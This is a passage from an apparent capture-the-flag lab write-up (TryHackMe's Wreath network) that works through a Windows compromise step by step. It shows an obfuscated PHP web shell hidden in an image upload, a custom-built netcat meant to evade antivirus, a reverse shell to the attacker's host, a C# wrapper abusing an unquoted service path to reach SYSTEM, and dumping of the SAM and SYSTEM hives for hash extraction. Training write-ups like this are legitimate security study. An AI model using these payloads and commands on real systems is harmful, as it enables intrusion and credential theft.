</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">6</span><span>    <span style="color:#fe8019">die</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">7</span><span><span style="color:#8ec07c">?&gt;</span>
</span></span></code></pre></div><p>It checks to see if a get parameter called wreath has been set, and then it calls shell_exec wrapped in pre tags.</p>
<p>Additionally we can make use of PHP <a href="https://www.gaijin.at/en/tools/php-obfuscator">obsfucators</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span><span style="color:#fe8019">&lt;?</span>php $z0<span style="color:#fe8019">=</span>$_GET[base64_decode(<span style="color:#b8bb26">&#39;d3JlYXRo&#39;</span>)];<span style="color:#fe8019">if</span>(isset($z0)){<span style="color:#fe8019">echo</span> base64_decode(<span style="color:#b8bb26">&#39;PHByZT4=&#39;</span>)<span style="color:#fe8019">.</span>shell_exec($z0)<span style="color:#fe8019">.</span>base64_decode(<span style="color:#b8bb26">&#39;PC9wcmU+&#39;</span>);}<span style="color:#fe8019">die</span>();<span style="color:#8ec07c">?&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span> exiftool -Comment<span style="color:#fe8019">=</span><span style="color:#b8bb26">&#34;&lt;?php \$p0=\$_GET[base64_decode(&#39;d3JlYXRo&#39;)];if(isset(\$p0)){echo base64_decode(&#39;PHByZT4=&#39;).shell_exec(\$p0).base64_decode(&#39;PC9wcmU+&#39;);}die();?&gt;&#34;</span> gabad00-shell.jpeg.php
</span></span></code></pre></div><p>After, uploading the shell, we have code execution.</p>
<pre tabindex="0"><code>http://10.200.84.100/resources/uploads/gabad002.jpeg.php?wreath=whoami
wreath-pc\thomas
</code></pre><pre tabindex="0"><code>http://10.200.84.100/resources/uploads/gabad002.jpeg.php?wreath=hostname
wreath-pc
</code></pre><p>We are going to need a full shell, but AV is still an issue. So we can compile our own version of nc from this git <a href="https://github.com/int0x33/nc.exe/">repo</a>.</p>
<p>We will need a 64 bit compiler that will work for windows programs.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>sudo apt install mingw-w64
</span></span></code></pre></div><p><code>x86_64-w64-mingw32-gcc</code> specifies 64 bit binaries.</p>
<p>We will add this <code>CC=x86_64-w64-mingw32-gcc</code> line to our makefile to specify the compiler, and then run <code>make</code>.</p>
<p>We can put this up onto our compromised machine with the following command.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>curl http://10.50.85.139/nc.exe -o c:<span style="color:#b8bb26">\\</span>windows<span style="color:#b8bb26">\\</span>temp<span style="color:#b8bb26">\\</span>nc-gabad00.exe
</span></span></code></pre></div><p>Then we can (hopefully) start a reverse shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>powershell.exe c:\\windows\\temp\\<span style="color:#fabd2f">nc-gabad00</span>.exe 10.50.85.139 443 -e cmd.exe 
</span></span></code></pre></div><p>We are in!</p>
<pre tabindex="0"><code>[~/thm/wreath/nc.exe]$ nc -nvlp 443                                        *[master]
listening on [any] 443 ...
connect to [10.50.85.139] from (UNKNOWN) [10.200.84.100] 51398
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\resources\uploads&gt;
</code></pre><h4 id="the-final-privesc">The Final PrivEsc</h4>
<p>We do have SeImpersonate so that may be one option.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 1</span><span>C:<span style="color:#fb4934">\xampp\htdocs\resources\uploads</span><span style="color:#928374;font-style:italic">&gt;whoami /priv</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 2</span><span>whoami /priv
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 4</span><span>PRIVILEGES INFORMATION
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 5</span><span>----------------------
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 7</span><span>Privilege Name                Description                               State
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 8</span><span>============================= ========================================= ========
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 9</span><span>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">10</span><span>SeImpersonatePrivilege        Impersonate a client after authentication Enabled
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">11</span><span>SeCreateGlobalPrivilege       Create global objects                     Enabled
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">12</span><span>SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
</span></span></code></pre></div><p>This may be something, but if look at the non-default services on the machine with:</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>wmic service get name,displayname,pathname,startmode | findstr /v /i <span style="color:#b8bb26">&#34;C:\Windows&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span>sc qc servicename
</span></span></code></pre></div><p>We see that <code> System Explorer Service</code> is unquoted.</p>
<p>With <code>sc qc SystemExplorerHelpService</code> we know that it is running as the system.</p>
<p>We can use <code>powershell &quot;get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list&quot;</code> to find that anyone can write here.</p>
<p>Now we need an exploit that will pass defender.</p>
<p>We need the <code>mono-devel</code> package to compile dotnet packages.</p>
<p>We will create an exploit that looks like this:</p>
<pre tabindex="0"><code>using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
                Process proc = new Process();
                ProcessStartInfo procInfo = new ProcessStartInfo(&#34;C:\\Users\\Thomas\\AppData\\Local\\Temp\\nc-gabad00.exe&#34;, &#34;10.50.85.139 443 -e cmd.exe&#34;);
                procInfo.CreateNoWindow = true;
                proc.StartInfo = procInfo;
                proc.Start();
        }
    }
}
</code></pre><p>Then we will compile it with mono using <code>mcs Wrapper.cs</code>. Now we have <code>Wrapper.exe</code>.</p>
<p>Getting it onto the box is easy enough with an smb server and impacket.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>smbserver.py share . -smb2support -username kali -password kali
</span></span></code></pre></div><p>We can authenticate using:</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>net use \\10.50.85.139\share /USER:kali kali
</span></span></code></pre></div><p>And copy the file like so:</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span><span style="color:#fe8019">copy</span> \\10.50.85.139\share\Wrapper.exe %TEMP%\wrapper-gabad00.exe
</span></span></code></pre></div><p>Then delete the share:</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>net use \\10.50.85.139\share /del
</span></span></code></pre></div><p>Now if we call our executable, we should get a shell, albeit not as an administrator</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span><span style="color:#b8bb26">&#34;</span>%TEMP%<span style="color:#b8bb26">\wrapper-gabad00.exe&#34;</span>
</span></span></code></pre></div><p>Now, we can copy our exploit into the vulnerable directory.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span><span style="color:#fe8019">copy</span> gaba-wrapper2.exe <span style="color:#b8bb26">&#34;C:\Program Files (x86)\System Explorer\System.exe&#34;</span>
</span></span></code></pre></div><p>Then, stop and restart the service:</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>sc query SystemExplorerHelpService
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span>sc stop SystemExplorerHelpService
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">3</span><span>sc start SystemExplorerHelpService
</span></span></code></pre></div><p>Now, we are an admin!</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span><span style="color:#fe8019">[</span>~/thm/wreath<span style="color:#fe8019">]</span>$ nc -nvlp <span style="color:#d3869b">443</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span>listening on <span style="color:#fe8019">[</span>any<span style="color:#fe8019">]</span> <span style="color:#d3869b">443</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">3</span><span>connect to <span style="color:#fe8019">[</span>10.50.85.139<span style="color:#fe8019">]</span> from <span style="color:#fe8019">(</span>UNKNOWN<span style="color:#fe8019">)</span> <span style="color:#fe8019">[</span>10.200.84.100<span style="color:#fe8019">]</span> <span style="color:#d3869b">51747</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">4</span><span>Microsoft Windows <span style="color:#fe8019">[</span>Version 10.0.17763.1637<span style="color:#fe8019">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">5</span><span><span style="color:#fe8019">(</span>c<span style="color:#fe8019">)</span> <span style="color:#d3869b">2018</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">7</span><span>C:<span style="color:#b8bb26">\W</span>indows<span style="color:#b8bb26">\s</span>ystem32&gt;whoami
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">8</span><span>whoami
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">9</span><span>nt authority<span style="color:#b8bb26">\s</span>ystem
</span></span></code></pre></div><h4 id="post-post-post-exploitation">Post-Post-Post Exploitation</h4>
<p>What are going to do now is grab the files that we need to crack some hashes. We need</p>
<ol>
<li>The SAM hive from <code>HKLM\SAM</code></li>
<li>The SYSTEM hive from <code>HKLM\SYSTEM</code></li>
</ol>
<p>We can save those like so</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>reg.exe save HKLM\SAM sam.bak
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span>reg.exe save HKLM\SYSTEM system.bak
</span></span></code></pre></div><p>Then copy them back to our share</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span><span style="color:#fe8019">move</span> sam.bak \\10.50.85.139\share\sam.bak
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span><span style="color:#fe8019">move</span> system.bak \\10.50.85.139\share\system.bak
</span></span></code></pre></div><p>We could also have just saved them directly there i.e.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>reg.exe save HKLM\SAM \\10.50.85.139\share\sam.bak 
</span></span></code></pre></div><p>Now we can use <code>secretsdump.py</code> from impacket to get some hashes.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>secretsdump.py -sam sam.bak -system system.bak LOCAL
</span></span></code></pre></div><p>And that about wraps it up. From here, if we couldn&rsquo;t crack the admin hash we could also add our own user for persistence, turn off defender etc&hellip;</p>
  
          </div>  
        </div>  

  </article>  


  
        </main>

<footer>
  <div class="footer_class">
    <p>
    <a href="../../pages/links" title="Reach out to me">Have Questions? Reach out to me.</a>
    </p>

  </div>
</footer>
</body>  
</html>

